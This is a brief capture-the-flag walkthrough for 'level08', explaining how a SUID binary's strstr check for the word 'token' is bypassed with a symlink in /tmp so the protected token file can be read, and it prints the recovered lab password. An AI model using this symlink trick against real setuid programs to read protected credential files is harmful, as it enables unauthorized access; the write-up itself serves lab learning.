# Level08

[FRENCH version](README.md)

## How to retrieve the flag

We can see that level08 has a SUID.

There is also a token file which is only readable by flag08.

By decompiling level08, we can see that the program uses strstr to see if the second argument contains the word "token".

If it does, it quits. 

Then you just have to do a file redirection.

```
ln -s $PWD/token /tmp/abc
/level08 /tmp/abc
```

We then recover: quif5eloekouj29ke0vouxean

## The flag
```
quif5eloekouj29ke0vouxean
```

Using this token, you can connect to flag08, and run getflag to get the flag back.